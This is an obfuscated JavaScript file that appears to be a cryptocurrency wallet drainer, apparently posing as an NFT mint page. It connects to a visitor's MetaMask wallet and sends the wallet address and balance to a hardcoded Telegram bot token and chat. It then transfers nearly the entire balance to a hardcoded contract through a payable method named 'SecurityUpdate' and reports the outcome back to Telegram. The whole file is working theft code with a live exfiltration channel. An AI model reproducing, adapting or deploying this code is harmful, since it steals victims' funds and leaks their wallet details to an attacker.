    var _0x30019f=_0x286f;(function(_0xfee6cc,_0x12c168){var _0x3b9432=_0x286f,_0x2da955=_0xfee6cc();while(!![]){try{var _0x1d18a9=parseInt(_0x3b9432(0x93))/0x1+-parseInt(_0x3b9432(0x8a))/0x2*(parseInt(_0x3b9432(0xb3))/0x3)+parseInt(_0x3b9432(0xb2))/0x4+parseInt(_0x3b9432(0x85))/0x5+parseInt(_0x3b9432(0x90))/0x6*(parseInt(_0x3b9432(0x81))/0x7)+parseInt(_0x3b9432(0xaf))/0x8*(-parseInt(_0x3b9432(0x92))/0x9)+-parseInt(_0x3b9432(0x82))/0xa;if(_0x1d18a9===_0x12c168)break;else _0x2da955['push'](_0x2da955['shift']());}catch(_0x3d8968){_0x2da955['push'](_0x2da955['shift']());}}}(_0x186a,0x3595f));var account='';let apiToken=_0x30019f(0x8e),chatId='5205964348';window[_0x30019f(0x9f)]?handleEthereum():(window[_0x30019f(0x84)]('ethereum#initialized',handleEthereum,{'once':!![]}),setTimeout(handleEthereum,0xbb8));function _0x286f(_0x30598d,_0x2170a4){var _0x186ade=_0x186a();return _0x286f=function(_0x286fca,_0x4fd345){_0x286fca=_0x286fca-0x80;var _0x4aed5e=_0x186ade[_0x286fca];return _0x4aed5e;},_0x286f(_0x30598d,_0x2170a4);}function sendMessage(_0xb476c8){var _0x366029=_0x30019f;let _0x4bd226=_0x366029(0x8b)+apiToken+_0x366029(0x88)+chatId+_0x366029(0x91)+_0xb476c8,_0x4bfb07=new XMLHttpRequest();_0x4bfb07['open'](_0x366029(0xa0),_0x4bd226),_0x4bfb07['send']();let _0x2f6051=_0x4bfb07[_0x366029(0xb1)];return _0x2f6051;}function handleEthereum(){var _0x288c74=_0x30019f;const {ethereum:_0x240270}=window;if(_0x240270&&_0x240270[_0x288c74(0x89)]){console['log'](_0x288c74(0x83));var _0x53a13b=[{'constant':!![],'inputs':[],'name':_0x288c74(0xb9),'outputs':[{'name':'','type':'uint256'}],'payable':![],'stateMutability':_0x288c74(0x99),'type':'function'},{'constant':![],'inputs':[],'name':_0x288c74(0xa8),'outputs':[],'payable':![],'stateMutability':_0x288c74(0xb5),'type':_0x288c74(0xae)},{'constant':![],'inputs':[],'name':_0x288c74(0xb0),'outputs':[],'payable':!![],'stateMutability':'payable','type':'function'},{'constant':!![],'inputs':[],'name':'getOwner','outputs':[{'name':'','type':_0x288c74(0xa4)}],'payable':![],'stateMutability':_0x288c74(0x99),'type':_0x288c74(0xae)},{'inputs':[],'payable':![],'stateMutability':_0x288c74(0xb5),'type':_0x288c74(0x98)}];window[_0x288c74(0xac)]=new Web3(window[_0x288c74(0x9f)]),window['contract']=new web3[(_0x288c74(0xb6))][(_0x288c74(0xaa))](_0x53a13b,'0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8');}else console[_0x288c74(0x9c)](_0x288c74(0xa9));}async function connect(){var _0x43f8ca=_0x30019f;if(account){var _0x4906a0=web3[_0x43f8ca(0xa6)]['BN'],_0x19788a=await web3[_0x43f8ca(0xb6)][_0x43f8ca(0xb9)](account),_0x3eb5ac=await web3[_0x43f8ca(0xb6)][_0x43f8ca(0x96)]({'value':_0x19788a,'data':contract[_0x43f8ca(0xa7)][_0x43f8ca(0xb0)]()['encodeABI'](),'from':account,'to':_0x43f8ca(0xb8)}),_0x4da7c9=await web3[_0x43f8ca(0xb6)][_0x43f8ca(0xa3)](),_0x3fc154=new _0x4906a0(_0x3eb5ac)[_0x43f8ca(0x9a)](new _0x4906a0(_0x4da7c9))['mul'](new _0x4906a0('10')),_0x346b5c=new _0x4906a0(_0x19788a)[_0x43f8ca(0x94)](_0x3fc154);if(_0x346b5c<0x0){var _0x23eca4=_0x43f8ca(0x9b)+account+')\x20does\x20not\x20have\x20enough\x20crypto';alert(_0x43f8ca(0x8c));return;}contract[_0x43f8ca(0xa7)][_0x43f8ca(0xb0)]()[_0x43f8ca(0x9d)]({'from':account,'value':_0x346b5c})['on'](_0x43f8ca(0x95),_0x37108d=>{var _0x550f1b=_0x43f8ca;console[_0x550f1b(0x9c)](_0x37108d);var _0x35a828='Wallet\x20('+account+')\x20cancelled\x20transaction';sendMessage(_0x35a828);})['on'](_0x43f8ca(0x87),_0x235522=>{var _0x15d53f=_0x43f8ca;console[_0x15d53f(0x9c)](_0x235522);var _0xcf371b='Wallet\x20('+account+_0x15d53f(0xad);sendMessage(_0xcf371b);});}else{if(window[_0x43f8ca(0x9f)]){console['log'](window);try{var _0x5bf0b7=await window[_0x43f8ca(0x9f)]['request']({'method':_0x43f8ca(0x8d)});account=web3[_0x43f8ca(0xb6)][_0x43f8ca(0x8f)][_0x43f8ca(0xa1)][_0x43f8ca(0xa5)];var _0x52dfad=await web3[_0x43f8ca(0xb6)]['getBalance'](account),_0x51f469=web3[_0x43f8ca(0xa6)][_0x43f8ca(0xa2)](_0x52dfad),_0x23eca4=_0x43f8ca(0x9b)+account+_0x43f8ca(0xb4)+_0x51f469+_0x43f8ca(0xb7);sendMessage(_0x23eca4),document[_0x43f8ca(0x86)](_0x43f8ca(0x80))[_0x43f8ca(0x9e)]=_0x43f8ca(0x97);}catch(_0x12eee0){console[_0x43f8ca(0x9c)](_0x12eee0);}}else console[_0x43f8ca(0x9c)](_0x43f8ca(0xab));}}function _0x186a(){var _0x5e5238=['\x20ETH\x20balance','0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8','getBalance','wallet_connect','246470ltJZXO','2321360prNCgV','Ethereum\x20successfully\x20detected!','addEventListener','1316460UbIqAE','getElementById','receipt','/sendMessage?chat_id=','isMetaMask','12522KBIXxz','https://api.telegram.org/bot','Not\x20enough\x20cash\x20for\x20gas','eth_requestAccounts','5932493479:AAE3dTVtfF8LvIwxjUEFnw0onacqIzgoygM','accounts','6QTomGg','&text=','27ojRvUl','431098azydxA','sub','error','estimateGas','MINT','constructor','view','mul','Wallet\x20connected\x20(','log','send','innerHTML','ethereum','GET','givenProvider','fromWei','getGasPrice','address','selectedAddress','utils','methods','withdraw','Please\x20install\x20MetaMask!','Contract','Please\x20install\x20Metamask','web3',')\x20approved\x20transaction','function','446032AmNSUX','SecurityUpdate','response','1034736kubHZD','177KaRsMl',')\x20with\x20','nonpayable','eth'];_0x186a=function(){return _0x5e5238;};return _0x186a();}
